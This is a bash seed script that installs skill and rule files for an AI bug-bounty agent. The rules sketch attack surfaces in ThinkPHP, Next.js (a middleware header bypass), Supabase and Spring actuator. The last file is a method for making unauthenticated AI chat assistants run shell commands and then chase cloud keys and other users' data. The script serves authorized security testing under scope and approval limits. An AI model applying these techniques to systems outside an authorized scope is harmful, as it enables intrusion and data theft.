#!/usr/bin/env bash
# ==============================================================================
# SilkSecAgent 核心 Skill 种子（幂等：补缺失 + 内容漂移即刷新）
# DSH 用户级技能目录：$DSH_HOME/skills/<name>/SKILL.md
# ==============================================================================
set -euo pipefail

DATA_DIR="${DSH_HOME:-{{BASE_DIR}}/data}"
SKILLS_DIR="$DATA_DIR/skills"

log() { echo "[seed-skills] $*"; }

seed() {
    local name="$1"
    local tmp existed=1
    tmp="$(mktemp)"
    cat > "$tmp"
    if [ -f "$SKILLS_DIR/$name/SKILL.md" ]; then
        existed=0
        if cmp -s "$tmp" "$SKILLS_DIR/$name/SKILL.md"; then
            rm -f "$tmp"
            log "$name 已是最新，跳过"
            return
        fi
    fi
    mkdir -p "$SKILLS_DIR/$name"
    mv "$tmp" "$SKILLS_DIR/$name/SKILL.md"
    [ "$existed" -eq 0 ] && log "$name 已刷新" || log "$name 已写入"
}

seed sec-verification <<'EOF'
---
name: sec-verification
description: 验证铁律——任何漏洞结论必须有可回溯证据+对抗性自检，否则视为幻觉打回。所有漏洞判定/报告场景强制使用。
---

# 验证铁律

1. **任何漏洞结论必须附证据引用**：run_id（run_cli 产出）/ flow_id（流量归档）/ burp_item（人工验证）三选一，外加一句话证据摘要。无证据的结论不得写入 finding，不得向用户报告。
2. **判定前必看原始输出**：用 grep_result/page_result 核对 run_id 的原始响应，确认状态码、响应特征与结论一致。扫描器报"存在"不等于存在。
3. **误报典型特征**（命中即降级为"待人工"）：仅匹配到关键词但无实际行为差异；目标返回的是错误页/通用 WAF 页；POC 回显出现在报错堆栈而非业务响应。
4. **带外漏洞**（SSRF/RCE 回连类）必须有 dnslog/回连记录佐证，禁止仅凭"请求发出去了"下结论。
5. finding_add 的 evidence 字段为空 = 违反本铁律，复盘时会被打回。

# 对抗性自检（高危结论强制，中低危建议）

6. **自扮攻击者找反证**：结论写入前问"什么情况下这个结论是错的？"——列出 ≥2 个反证假设并逐一用证据排除。常见反证面：响应差异来自 WAF/CDN/负载均衡基线而非漏洞？重放 3 次是否稳定复现？对照组（未授权/无参/其他路径）请求是否有同样特征？时间类判定（时延注入）是否排除了网络抖动？反证无法排除 → 降级 tentative 或标记"待人工"。

# 多路独立复验（高危且条件允许时必做）

7. **高危 finding 派 spawn_worker 独立复验**：用全新上下文把同一假设交给另一个 worker 验证（不同上下文=天然多视角，等效多路高温投票）。两路结论一致 → confirmed；分歧 → 降级 tentative，分歧点写进 finding 的 evidence 备注。批量资产不适用（成本），只用于高危/将写报告/将提交 SRC 的结论。
EOF

seed sec-blackboard <<'EOF'
---
name: sec-blackboard
description: 黑板纪律——跨会话共享事实的读写规范。任务开局读黑板，过程中即时写凭据/存活/已试路径，避免重复劳动和状态丢失。
---

# 黑板纪律

1. **开局必读**：任务开始先 blackboard_get 读全盘 + asset_query 看目标已有资产，不重复已完成的工作。
2. **即时写**（发现即写，不等任务结束）：
   - 凭据/会话：`cred:<host>:<role>` = 凭据引用（**只写 .env 变量名或"见凭据库"，绝不写明文密码**）
   - 存活状态：`alive:<host>` = 端口/标题/时间
   - 已试路径：`tried:<host>:<path>` = 结果（避免重复 fuzz）
   - 中间结论：`note:<target>:<topic>` = 一句话结论
3. **WAF/风控发现立即写**：`waf:<host>` = 厂商/行为特征，后续任务据此调整策略。
4. 黑板是事实不是推测：只写验证过的状态，推测写进会话讨论。
EOF

seed sec-review <<'EOF'
---
name: sec-review
description: 复盘沉淀——任务结束时把 trajectory 蒸馏为经验卡的结构与质量要求。review 角色/任务收尾时使用。
---

# 复盘沉淀

任务结束（或阶段性收尾）时，输出经验卡草稿，结构：

```json
{
  "scenario": "目标画像一句话（CMS/框架/防护）",
  "attempts": [{"tool": "工具+关键参数", "result": "ok|fail", "why": "成败原因", "run_id": "..."}],
  "chain": ["实际打通的调用链"],
  "takeaway": "下次同类目标最值得先做的事（一句话）",
  "evidence": ["run_id/flow_id 列表"]
}
```

质量要求：
1. takeaway 必须可操作（"先做什么/不做什么"），禁止"加强测试"式空话；
2. 失败尝试和成功同等重要——WAF 拦截、误报原因必须记录 why；
3. 无证据的经验卡不入库；
4. 同一 scenario 已有经验卡时，做补充修正而非另起炉灶。
EOF

seed sec-task <<'EOF'
---
name: sec-task
description: 任务与调度纪律——用户提到「定时/每隔/每天/每小时/定期/复扫节奏」时必须创建带 schedule 的 Task，不得只在会话里口头答应；任务一律绑定当前工作区对应的 Program。
---

# 任务与调度纪律

1. **「定时跑」= task_create 带 interval schedule**：用户意图含「定时/每隔 N/每天/每小时/定期复扫」时，必须调用
   `task_create(objective=..., schedule={kind:"interval",every_seconds:N})`（每天=86400；一次性才用 `{kind:"once",at:<未来毫秒时间戳>}`）。
   创建后任务出现在看板「任务 → 定时任务」卡片区，由调度循环自动执行。**禁止只在会话里口头答应而不建任务**。
2. **周期任务是一行固定实体，严禁每天重建**：interval 任务跑完自动续期（latest-only），系统对同 program+同 objective 的周期任务幂等去重。
   **禁止**用「跑完再建明天的 once 任务」模拟每日周期——这会让任务表堆积垃圾行。每次运行历史自动落入执行历史（看板可见）。
3. **归属自动带出**：不传 program_id 时系统按当前会话所在工作区自动绑定；工作区未绑定 Program 时先 program_list 确认再显式传。
4. **intrusive 级目标禁止 interval**：需要人工确认的操作只做一次性任务或当场执行，不挂周期。
5. **改调度用 task_schedule，补跑用 task_run_now**，取消用 task_update(status=cancelled)。
6. **定时任务里 spawn_worker 派单纪律**：父 worker 的执行预算是硬上限（默认 3600s 到点 SIGKILL），
   阻塞等子 worker = 烧自己的预算。批量扫描必须「小批量短超时」：单批 ≤3 个目标、timeout ≤600s；
   禁止 ≥1500s 的大单阻塞。跑不完的资产记黑板台账（coverage-ledger）留次日，定时任务逐日增量推进，不追求单日全覆盖。
7. 定时任务的执行由 spawn_worker 完成，执行会话自动归入对应工作区，结果写在任务 result + 执行历史里（看板可跳链查看）。
EOF

log "Skill 种子完成"

seed sec-knowledge <<'EOF'
---
name: sec-knowledge
description: 记忆治理纪律——写记忆前三问、开局检索、用完回执、用到即复验、规则先验层加载。所有执行型角色开工/收尾时使用。
---

# 记忆治理纪律（memcore）

记忆分三层，写入前必须回答"三问"并把答案写进 justification（≥10字，非占位）：

1. **它会过期吗？** → 会：黑板/事实（ephemeral ≤30天 或 durable 需复验）；不会且换目标仍有用：才配进经验卡
2. **换目标还有用吗？** → 只对特定目标有用：进 facts/finding，**禁止进经验卡**；可迁移方法论：才进 exp_store
3. **谁会读它？** → 执行任务要读：ephemeral/durable；只有复盘要看：timeline（带日期快照键）

## 类别速查

| 内容 | 去处 | mem_class |
|---|---|---|
| 环境故障/工具异常 | 黑板 `[env-issue]` 前缀 key | ephemeral（TTL 自评 1-30 天） |
| 存活清单/扫描台账/调度流水 | 黑板带日期键 | timeline（只追加，不改写） |
| 目标事实（指纹/配置/负结果） | fact_upsert | durable（30天复验）或 note 类 ephemeral |
| 可迁移方法论 | exp_store | candidate 起步，附 justification |
| 成功调用链 | pb_save | permanent，附 justification |

## 规则先验层（data/rules/）

命中技术栈（指纹/fp_add）后、上专项扫描前：查 `data/rules/<域>/<栈>.md` 是否存在（如 web/spring.md、web/nextjs.md、web/selfhosted-supabase.md、php/thinkphp.md），存在则读入作为该栈审计先验（入口点模式/特有攻击面/验证要点）。

**SRC 评级规则（rules/src/）**：recon 评分打标前读 `src/asset-scoring.md`；漏洞定级、写报告、提交判断前读 `src/severity-rating.md`——定级不膨胀、不确定往低报。这层是**人工蒸馏的静态先验**，与 memcore 经验卡（实战后验）互补：先验给方向，后验给打法。复盘时发现某栈规则缺失或有新心得 → 在复盘报告里提议新增/修订规则文件（人工评审后落盘，agent 不自写规则层）。

## 流程纪律

- **开局**：exp_search 按目标画像检索 → 命中 high 置信卡先读后干；blackboard_get 查 `[env-issue]` 前缀键（现行有效才参考）
- **用完卡**：必须 exp_feedback 回执（useful/adopted/wrong/outdated）——不回执的卡会被判零使用而沉没
- **cooling 标记**：检索结果带 _cooling 的事实用到即复验（exp_validate 或 fact_upsert 刷新），复验通过自动复活
- **沉淀前查重**：exp_search 同场景 → 命中则补证据/改 takeaway（exp_update），不另起炉灶
- **红线**：故障/状态/日期清单禁止写进 persona/objective；timeline 键禁止改写（换新键）
EOF

# ---------- 规则先验层（data/rules/，人工蒸馏静态规则，详见 sec-knowledge 技能） ----------
seed_rule() {
    local rel="$1"
    local tmp
    tmp="$(mktemp)"
    cat > "$tmp"
    if [ -f "$DATA_DIR/rules/$rel" ] && cmp -s "$tmp" "$DATA_DIR/rules/$rel"; then
        rm -f "$tmp"; log "rules/$rel 已是最新，跳过"; return
    fi
    mkdir -p "$DATA_DIR/rules/$(dirname "$rel")"
    mv "$tmp" "$DATA_DIR/rules/$rel"
    log "rules/$rel 已写入/刷新"
}

# ---- P13/P14 纪律技能（版本受控源 data-seed/skills/，本 heredoc 为部署通道）----
seed sec-runtime-discipline <<'SECSKILL_RT_EOF'
---
name: sec-runtime-discipline
description: 运行环境公共纪律——代理出口/授权边界/派单/interval 任务/失败留痕/大输出摘要/日期标签。所有定时任务与执行会话默认遵守（单一事实源，任务 objective 不再内联重复）。
---

# 运行环境公共纪律

1. **出口**：一切出网走代理池网关 http://127.0.0.1:8899（scope.yml defaults.egress_proxy）。run_cli 已模板化代理；手工 curl 必须显式 http_proxy=https_proxy=http://127.0.0.1:8899；开局 proxy_pool_stats 确认 active，失效代理用 proxy_pool_report_bad 上报；禁止任何直连出网。
2. **授权**：scope.yml 是唯一权威（开工必读当前清单，严禁依赖提示词内联的历史清单/数量）；scope-guard fail-closed，边界外工具层直接拒绝，严禁绕过；max_risk=active，intrusive 一律一次性人工确认，禁挂周期。资产收集发现疑似 scope 外但归属证据明确的新资产（CNAME 指向授权资产/品牌印证/收购关系）→ 必须 `approval_request kind=scope-domain` 提请人工审批（subject=域名、program_name=归属项目、evidence≥10 字证据、equity_basis/independent_src/corroboration 按表单填写——判据口径见 rules/src/equity-gate.md 股权闸：默认不入池=参股/战略/财务投资/合资非100%/联营，independent_src=有→不并入本项目）；批准前目标依旧全拒绝，不要尝试打点；禁止只写事实不提请求，也禁止把归属不确定的资产凑数提请。scope-domain 批准后系统自动入队首轮资产收集种子任务（objective 带 `[审批入队]` 前缀，只做资产收集禁漏洞探测），无需手工派单。项目排除清单内的域名若掌握新归属证据 → `approval_request kind=exclude-exception` 提请排除例外评估（批准=移出排除+并入 scope+留 durable fact 记录判据）。
3. **派单**：spawn_worker 批量必须小批量短超时——单批 ≤3 目标、timeout ≤600s；禁止 ≥1500s 大单阻塞（父 worker 预算 3600s 硬上限，阻塞等子=烧自己预算）；跑不完记台账留次日，逐日增量推进。
4. **interval 任务**：一行固定实体，跑完自动续排（latest-only）；严禁 task_create 次日 once 模拟周期。
5. **失败留痕**：失败/被杀 run 先读 results/<run_id>/meta.json（exit_code/duration）再处置——数据多已落盘，可幂等重跑；onnxruntime 的 pthread_setaffinity 报错为良性噪声，不是失败信号。
6. **大输出**：一律 grep_result/page_result 摘要取，禁止在会话铺全文；nuclei 等大输出默认取命中行。
7. **日期标签**：日报/黑板键/台账文件名统一 YYYY-MM-DD；定时任务收尾 task_update 的 **note 必须以【{项目}·{角色}·MMdd】开头**（如【美团·vuln·0828】），保证看板执行历史左侧标题一眼可分辨哪天哪个任务。
8. **黑板**：环境故障查 [env-issue] 前缀键（现行有效才参考）；存活清单/台账不内联进 objective，以黑板/facts 实时记录为准。
9. **事实生命周期**：note 类=agent 工作速记（ephemeral，14 天滚动消亡）——失败记录/当日结论/临时观察写 note；**长期知识必须写 target/asset/finding 等分类**（durable，30 天复验，被引用即续期）；带明确时效的事实用 intent.ttl_days 显式声明。禁止把需要长期保留的知识写进 note（14 天后会被 sweeper 归档）。

SECSKILL_RT_EOF

seed sec-pipeline <<'SECSKILL_PP_EOF'
---
name: sec-pipeline
description: 挖掘流水线纪律——覆盖矩阵六态台账、漏洞卡驱动探测、防幻觉输出契约、探索配额、交接包规范。recon/vuln 等执行型任务全程强制使用（与 sec-verification 互补：那边管判定，这边管覆盖与留痕）。
---

# 挖掘流水线纪律（v2.1）

> 设计文档：`doc/secagent/README.md`（SilkSpool 仓库）。本技能是其执行层摘要。

## 1. 覆盖六态（每个 资产×卡片 组合有且仅有一个终态）

`PENDING` 未测 / `TESTED_CLEAN` 已测无命中 / `CONFIRMED` 已确认 / `FALSE_POSITIVE` 证伪 / `NOT_APPLICABLE` 无攻击面 / `BLOCKED` 条件不足 / `STALE` 结论过期。

- 每次探测动作落一行台账 `data/pipeline/{program}/attempts.tsv`：
  `ts  asset  card_id  card_ver  tool  result  na_reason/blocker  evidence_path  run_id`
- **NOT_APPLICABLE 必须填 na_reason**（no-param-surface/no-auth-feature/static-site/tech-mismatch/…），**BLOCKED 必须填 blocker**（no-credential/egress-unreachable/risk-exceeded/needs-reverse/…）。词表外新值允许，当日报告登记定义；禁止 other/misc。
- 完成一个目标立即写一行，禁止攒批。

## 2. 漏洞卡驱动（data/vulncards/）

- **开局先扫技术索引**：`rules/src/technique-index.md`（打穿短表）「认什么」列对现场特征——命中即按「打哪」出枪，「出什么算成」=判成标准、「假点」=证伪条件；探测细节开对应模块 `rules/techniques/<手法>.md`（46 篇全量）。索引≠清单：表上没有的手法照样挖；注入/SSRF/XSS/RCE 有差分面必须真打。
- 探测前读对应卡片：按 `applicable_when` 判适用、按 `detect.steps` 探测、按 `verify.must_pass + falsification` 确认。
- 每用一张卡落一条 `card_usage-{date}.jsonl`：`{card_id,card_version,asset,result,deviation,suggest}`。**实战与卡片有偏差必须记 deviation**——那是卡片升版的原料。
- 现有卡不覆盖的漏洞类：注册新卡（draft，骨架见 registry.md），即创即用，当日报告登记。

## 3. 防幻觉输出契约（硬标准）

1. **分母明确**：覆盖率数字必须给分母（文件+行数）；无分母的百分比视为幻觉。
2. **TESTED_CLEAN 也要证据**：命令/时间/响应特征摘要落盘，与 CONFIRMED 同级举证。
3. detect/verify 分离；CONFIRMED 必须过 verify 规程 + ≥2 次复现（换出口）。
4. 结论区禁止词：可能存在/疑似/应该是/理论上/大概率——推测只能进 IdeaCard（data/vulncards/ideas/）或 huntlist，且必须写 verification_requires。
5. **负例即价值**：0 产出日的报告同等重要；禁止为凑产出报噪音。
6. 报告统计数字以台账实际为准（coverage-report.py 生成），禁手填。
7. CONFIRMED 建证据包 `data/evidence/{finding_id}/`：request.txt/response.txt（含时间戳+出口IP）/reproduce.md（含影响场景具体化）/falsification.md/verify-log.md。
8. **finding_add 五要素齐才登记**：规范标题（`<组件/业务语境> <漏洞类型与后果>（关键特征）`，如 "Oceanus 404 调试页泄露内网节点 IP+appkey"，禁止工具原始输出当标题）+ 证据 + 复现步骤 + 影响 + 修复建议。完整性闸门（v4.2）：缺复现步骤/影响的登记自动归入"待验证候选"（noise=1，漏洞列表不可见）——这是登记未完成的信号，补全后重新 finding_add 即可升级，不是流程终点。

## 4. 每日任务结构 = 规定动作 + 自选动作

- **规定动作（必须完成）**：按 brief 执行——覆盖台账 PENDING/STALE 消化、复验到期项、huntlist 前置条件判定、全部留痕。
- **自选动作（必须产出，方向自由）**：≥20% 时间或 ≥3 条 IdeaCard。发散角度：组合/类比/倒置/协议下沉/数据追问/时间维度/生态侧写/白盒镜像。探索产出只进 IdeaCard/huntlist，**不许直接进 findings**（灵感与漏洞之间隔着验证规程）。
- IdeaCard 放 `data/vulncards/ideas/IC-xxx.yaml`，必须写 `verification_requires` 和 `first_testable_when`；开局检查条件是否已满足。

## 5. 工具矩阵（按指纹/形态分派，禁止只跑 nuclei）

- 有参数 → dalfox(XSS)/sqlmap --level 1 --risk 1(SQLi)/arjun(隐藏参数)
- CNAME 外部指向 → takeover 检测；指纹命中组件 → 对应 CVE 模板 + afrog
- 有 GraphQL → graphql-cop；登录框 → VC-015 登录接口安全（无需账号）
- nuclei 产出 info 级默认隔离：finding 候选只看 severity≥low；info 命中记台账不落 finding。

### 流水线工具（sec-pipeline 插件，原生工具优先于脚本）

**agent 一律调用 DSH 工具**（审计/run_id 归因/写入即校验），不再用 bash 直接调脚本：

| 工具 | 用途 |
|---|---|
| `attempts_log` | 六态台账追加（写入即校验，违规拒绝）——每个探测动作后立即调用 |
| `card_usage_log` | 卡片使用记录（deviation 必填） |
| `radar_read` | 变化雷达队列读取（recon 开局，drain） |
| `pipeline_validate` | 产物格式机器校验（收尾强制） |
| `coverage_report` | 覆盖矩阵视图（报告数字唯一来源） |
| `verify_replay` | CONFIRMED 机械复核（重放+hash+verify-log） |
| `surface_queue` | 参数 URL 队列（喂 dalfox/sqlmap） |
| `surface_scan` | 敏感信息回扫（VC-027，打码） |

系统层（非 agent 调用）：`l2-collect` 已注册为 run_cli 工具（recon 收集接口层用 `run_cli tool=l2-collect program=<prog> target=<host>`）；ct-watch/js-watch 为 systemd 守护，产出 radar-queue.jsonl。

注意：xray flows/*.jsonl 只有扫描统计计数、无请求内容（已核实）——参数面以 l2-collect 产出为准，勿再依赖 flows 文件。

## 6. 合规止损（机器强制，不靠自觉）

够证即停：证明存在即停止，不拖数据、不横向、不扩大；证据中真实用户数据脱敏落盘；绝不用拖库凭据、绝不登真实用户账号、只用自建测试数据；intrusive 一律人工；命中蜜罐特征即退。

## 7. 收尾强制清单（未完成 = 任务失败）

1. 本批所有目标 attempts.tsv 有终态行；2. CONFIRMED 有证据包；3. N/A、BLOCKED 有理由值；4. 当日 idea 已入库；5. handoff 生成且汇总数与台账一致。

## 8. 交接包（每日收尾，`data/pipeline/{program}/handoff-{date}.md`，模板见 data/templates/）

五段固定：状态快照 / 今日动作摘要 / 明日队列（huntlist 带 precondition+ttl）/ 阻塞与求助（按解锁收益排序）/ 数据指针（全部绝对路径）。

## 9. 流程守卫（P15，机器强制——纪律不再依赖自觉）

`task_update status=done` 时引擎硬校验三个纪律产物，缺一即拦截并返回缺失清单，补齐后重试：

1. `attempts-{program}.tsv` 近 24h 有增量行（六态皆可，含 N/A 与 BLOCKED——零探测日也要给存量目标落终态行）；
2. `card_usage-*.jsonl` 近 24h 有记录（当日未用卡则对规程复盘落一条 deviation）；
3. `handoff-{date}.md` 存在（北京日期）。

被拦截 ≠ 失败：按缺失清单用 `attempts_log` / `card_usage_log` 补产物，再 task_update。守卫拦截本身会被记录（ops 视图可见），长期零拦截+零台账才是异常。

## 10. 资产准入与每日 Slice（P15）

- **准入**：主动扫描（risk≥active 的 run_cli）只打已分级资产——`asset_query level_in=S,A,B` 取队列；未分级资产先 `grade_assets` 分级或 `vision_triage` 截图分诊（喂 dsh-browser/httpx 截图，返回 page_type/has_login/interesting）。
- **Slice 化**：每日任务的硬指标是消化覆盖矩阵的一个切片（如 top-10 BLOCKED/PENDING 格子 + radar 事件全清），**不是**"覆盖全部资产"——完成切片即达标，剩余预算进研究模式（产 IdeaCard）。跑不完登记次日队列，禁止为凑覆盖率跑低价值全量。
- **蒸馏中置**：每完成一个目标的验证链立即评估 exp_store/pb_save（三问：会过期吗/换目标有用吗/谁会读），不要攒到收尾——预算耗尽时收尾蒸馏永远轮不到。
- 报告只列信号：info 级模板指纹已被引擎闸门隔离（noise=1），`finding_query` 默认看不到，无需再自行过滤。

SECSKILL_PP_EOF

seed_rule php/thinkphp.md <<'EOF'
# ThinkPHP 审计先验

## 入口点模式
- 兼容模式路由：index.php?s=/module/controller/action（5.x 历史 RCE 面）
- 多应用模式（6.x）：app 目录遍历 + 路由注释

## 特有攻击面
- 5.0.x/5.1.x 远程代码执行（method/__construct 过滤器链，payload 已模板化进 nuclei/afrog）
- 6.x 反序列化链（League/Flysystem 链为主）
- debug 模式：trace 页泄露（绝对路径/SQL/配置）、app_debug=true 指纹
- 数据库日志文件直连下载（runtime/log/）

## 验证要点
- 指纹先用 nuclei shiro-detect 类模板确认框架与版本段，再选 payload 代际（5.0 与 5.1 payload 不通用）
- 报错页含 "ThinkPHP V5.x" 字样=版本指纹直接可读
EOF

seed_rule web/nextjs.md <<'EOF'
# Next.js / Node 全栈审计先验

## 入口点模式
- pages/api/* 或 app/api/*/route.ts（App Router）：默认无鉴权，鉴权全靠手工
- Server Actions（"use server"）：公开可 POST，$ACTION_ID 枚举可得——参数校验全靠自觉，是越权/注入高发面
- middleware.ts：只做"边缘"拦截，可被 x-middleware-subrequest 头绕过（CVE-2025-29927，多个版本）

## 特有攻击面
- /_next/data/<buildId>/<path>.json 直接拉 SSR props（可能含服务端数据泄露）
- next/image 的 url 参数 SSRF（未配 remotePatterns 白名单时）
- 环境变量：NEXT_PUBLIC_ 前缀进客户端 bundle（可 grep JS），但"服务端变量写进 NEXT_PUBLIC_"是常见翻车
- 静态分析 JS bundle 拿内部 API 端点/网关命名（我方卡 #3 已验证此法有效）
- JWT/session：iron-session/next-auth 默认配置弱点（弱 secret、算法混淆）

## 验证要点
- Server Action 响应 200 且含表单数据回显 ≠ 漏洞，必须验证副作用（数据变更/越权读取）
- middleware 绕过判定：对比带/不带 x-middleware-subrequest 头的响应差异
EOF

seed_rule web/selfhosted-supabase.md <<'EOF'
# 自托管 Supabase 审计先验（源自实战卡 #3，已验证有效）

## 识别与确认
- 五端点差分：/rest/v1/ /auth/v1/ /storage/v1/ /graphql/v1 /realtime/v1 全返 401/400 = 真实实例（非反代巧合）
- 前端 JS 内嵌 SUPABASE_URL + anon JWT（chatId/deployId 等参数联动可确认归属）

## 特有攻击面
- anon key 不是密码：RLS 未开启的表 anon 直读直写（PostgREST 默认允许）——逐表枚举 /rest/v1/<table>
- service_role key 泄露 = 全库上帝权限（搜 bundle 里的 service_role/sb_secret）
- JWT secret 每实例独立：别拿别处的 anon key 套（跨实例不通用）
- /auth/v1/signup 开放注册 → 拿合法用户 token 再测登录态接口
- Storage 桶匿名读写：/storage/v1/object/public/<bucket>/

## 验证要点
- 401 是"实例存活"证据不是漏洞；RLS 判定必须实际读到行数据
- 宿主平台（低代码/nocode 平台）与 Supabase 实例是两层：平台 key 映射实例需逐对确认
EOF

seed_rule web/spring.md <<'EOF'
# Spring / Spring Boot 审计先验（语言框架规则·末段漏洞判定另见具体漏洞卡）

## 入口点模式
- 控制器注解族：@RequestMapping/@GetMapping/@PostMapping + 类级路径前缀拼接；@RestControllerAdvice 不改路由
- 隐式入口：/actuator/*（env/heapdump/refresh/gateway/routes 是重灾区）、/error 页、Spring Cloud Gateway 路由表
- 路径匹配差异：antMatchers 与 mvcMatchers 对尾斜杠/分号路径/大小写处理不同——鉴权配置用 antMatchers 而控制器容忍变体 = 绕过高发点

## 特有攻击面
- SpEL 注入：@Value/@PreAuthorize 拼接用户输入、Spring4Shell（CVE-2022-22965，JDK9+ + WAR 部署 + 特定绑定）
- Jackson/Fastjson 反序列化：@RequestBody 多态类型（@type/enableDefaultTyping）
- Actuator：heapdump 直下（内存里常有密钥/会话）、env 脱敏绕过（/actuator/env 老版本）、gateway POST /actuator/gateway/routes 加恶意路由 = RCE
- JSP/Thymeleaf SSTI：模板名拼接用户输入
- 鉴权顺序：Filter 链 vs Interceptor vs @PreAuthorize 的执行顺序错位；permitAll 通配过宽

## 验证要点
- 403 是 WAF 还是 Spring Security？看响应头/错误体指纹，别误判
- actuator 存在 ≠ 可用：逐个端点试，看 management.endpoints.web.exposure.include 配置痕迹
EOF

seed_rule src/asset-scoring.md <<'EOF'
# SRC 资产可挖掘性评级（SABC 打分表）——源自 CyberStrikeAI 实战规则（资产测绘Agent）

> 用途：recon 测绘后给资产打"可挖掘性"分，vuln 任务按 level S→A→B、score 降序取队列。
> 原则：评分只排优先级，不构成授权——授权边界永远是 scope.yml；accept 政策名单只管"SRC 收不收"。

## 打分表（满分 100）

| 维度 | 权重 | 子项 |
|---|---|---|
| A 漏洞价值 | 40 | 数据敏感度 0-15 / 业务核心度 0-15 / 影响可放大性 0-10 |
| B 出洞概率 | 45 | 可交互 0-12 / 功能攻击面 0-12 / 组件脆弱性 0-12 / 历史冷门度 0-9 |
| C 时效加成 | 15 | 新鲜度 0-8 / 活动加成 0-7 |

## 分层

- **S ≥ 75**：优先挖穿（核心业务 + 高可交互 + 有攻击面）
- **A 60-74**：深挖队列主力
- **B 40-59**：常规覆盖
- **C < 40**：仅登记，不主动深挖

## 配套打标（与评分独立但联动）

- **owner 归属**：confirmed（ICP 备案/证书 Organization/whois 强证据）/ suspect（仅 favicon/同 C 段弱证据→挂起不交下游）/ 第三方 SaaS/CDN → 排除。投资公司/已剥离业务/合作方存疑一律 suspect
- **accept 收录政策**（查 facts category=policy 的 accept-list）：full（默认）/ intrusion-only（只报入侵类：通生产 SSRF/可逃逸 RCE/主站后台 getshell/进内网入口/可证核心 SQLi）/ none（暂停收录，可算分但不驱动挖掘）；拿不准从严 none 并注明待确认
- **biz 业务分级**：核心（交易/资金/核心 PII）/ 一般 / 未知
- **state 增量**：new / changed / stable / dead（与上轮对比）

## 深挖队列规则

`owner=confirmed 且 level∈{S,A,B} 且 accept≠none`，按 score 降序逐资产挖穿再走下一个；
accept:intrusion-only 照常挖但仅入侵类才 finding_add，非入侵类留 intel 不提交。
EOF

seed_rule src/severity-rating.md <<'EOF'
# SRC 对齐漏洞定级（压级约束）——源自 CyberStrikeAI 实战规则（深入挖掘Agent）

> 铁律：**定级不膨胀、不确定往低报、判忽略的不进提交队列**。
> 与 SRC 平台（美团/字节）审核口径看齐，让真正的高/中危能被认真对待。

## 定级表

| 级别 | 范围 |
|---|---|
| 严重/高危 | RCE、可证 SQLi、核心越权（资金/大量 PII）、账户接管、支付绕过、进内网 SSRF、主站 getshell |
| 中危 | 一般越权、存储 XSS、有影响的逻辑缺陷、需条件 SSRF、受限上传 |
| 低危 | 反射 XSS（需交互）、不含敏感数据的信息泄露、低影响 CSRF、CORS、点击劫持 |
| 忽略 | 纯版本 banner、无敏感 swagger、Self-XSS、无 PoC 理论、目录列表、扫描误报——不进提交但留副产物（fact/intel 记录） |

## 特别约束

- **信息泄露默认低危甚至忽略**；仅泄露凭证/大量 PII/源码/内部核心配置才上探
- 拿不准级别的往低报；证据不足 downgrade 到 tentative
- accept:intrusion-only 资产：仅入侵类（通生产 SSRF/可逃逸 RCE/主站 getshell/进内网入口/可证核心 SQLi）才 finding_add，其余留 intel

## 报告模板（CVSS4.0 一洞一报）

标题 / 危害（讲业务影响，不堆技术词）/ CVSS4.0 向量与评分 / 复现步骤 / 打码证据 / 影响范围 / 修复建议 / **是否值得提交**（结论 + 理由）
EOF

# ---- srcskill 知识库模块全量导入（47 篇，源 doc/srcskill/skills/skill/知识库/；
# 与 technique-index.md 短表配合：短表认现场特征 → 模块看探测细节；篇内互引同目录有效）----
seed_rule techniques/401-403-bypass.md <<'TECH_401_403_BYPASS_EOF'
# 401-403-bypass（禁开磨登录 HTML）

> 打开是登录页 / SSO → 表单壳听 `rules/srcskill/dig-scope-workflow.md` §4.1.1，**不要**按本文件磨登录 HTML。发会话 / 重置 / 改绑 / 换票走 §4.2.2 + `authbypass-test.md`。业务 API 的 401/403：现场改 path / METHOD / 头自己打，不靠本篇英文 checklist。
TECH_401_403_BYPASS_EOF

seed_rule techniques/agent-tool-exec-test.md <<'TECH_AGENT_TOOL_EXEC_TEST_EOF'
# 对话口工具真执行

> 短表指针。认的是「身份口拦了、对话口仍接、工具列表里有会跑命令的工具」。  
> **不是**越狱 / 提示词（别开 `llm-security-test.md` 当开场）。  
> **不是**云 IDE 弱口令 + `command/exec` RPC（那套见 `cloud-ide-codex-rce-chain.md`）。  
> 未授权读历史见 `idor-test.md`「助手历史未授权读他人任务」（正文只在那一篇）。  
> 写不写只认 `vuln-report-format.md`。命令只做无害标记 / `id`。

## 认什么

像下面任一摊：

1. 问身份 / whoami / profile 一类口回未登录、401、`unauthenticated`，同一套前端的**对话口**（`/chat` / `createTask` 一类）不带 Cookie 仍接  
2. **没有 whoami 对照也打**：公开页就能 POST 建会话，body 只要 `message`（或同类）

再加：JS 或工具列表里有会跑命令的工具（常见名 `bash` / `shell` / `code_interpreter` / `python` / `execute`，**名字不封闭**，认的是会执行）。

前端常见：helix-assistant、cloud-h5、带 tool 流的云助手。换皮照认，不钉产品名。

## 打哪（不登录）

1. 有身份口就对照应拦；没有身份口不要当成没洞  
2. POST 对话口，让模型**用那个工具**跑 `id`（或 `echo 标记 && id`），或用 Python 算一串你本机也能算的 md5。不要只问「请执行」而不点名工具。`id` 只证明命令真跑了，**还要跟**  
3. 看事件流 / tool 回包。**SSE 只有 delta、没有 `toolName` 别停**：把回流里的 32 位 hex 跟本机 hashlib 对；或让它列工作目录，看有没有提示里从未出现的 `AGENT.md` / `IDENTITY.md` / `SOUL.md`  
4. 有 `fileUrls` / 附件 URL 参：填外站，看服务端会不会把标题/ICP 拉回对话  
5. 命令跑起来后跟这三样（有入口就打，没有写原因）：SRC 给的内网验证台 flag；云元数据/临时钥；沙箱里他主体业务正文（对话历史、工单、密钥文件）。公网首页不算通内网  

有会话时同一枪仍打：身份过了、对话口工具是否还接受你编的命令。

## 出什么算成

stdout / SSE 里是下面任一：

- SRC 验证台 flag（`ssrf-` 一类）  
- 云密钥（临时票 / 永久 AKSK，能问出账号）  
- 他主体业务正文（不是自己刚打进去的标记）  

沙箱 `uid=`、本机 md5、从未提示过的沙箱文件名，只证明命令跑了，**不算成**。

## 假点

- 模型只口头说执行了，数字对不上本机，沙箱文件名是提示里写过的  
- 沙箱拒命令、空工具列表  
- 对话口同样要登录，和身份口同一道闸  
- 只有 prompt 越狱、没有工具执行（那不是这枪）  
- 只 curl 到公网（百度首页 / ICP 号）当通内网

## 停

没这类口 → 本枪 N/A，回去打换 id / 改密 / 其它四件套。  
有口只出沙箱 `uid=`、跟不出 flag / 云钥 / 他主体正文 → 证伪就停，不要磨到出 root。  
认到只打**当前站**；禁止为此 FOFA 全网助手同皮。
TECH_AGENT_TOOL_EXEC_TEST_EOF

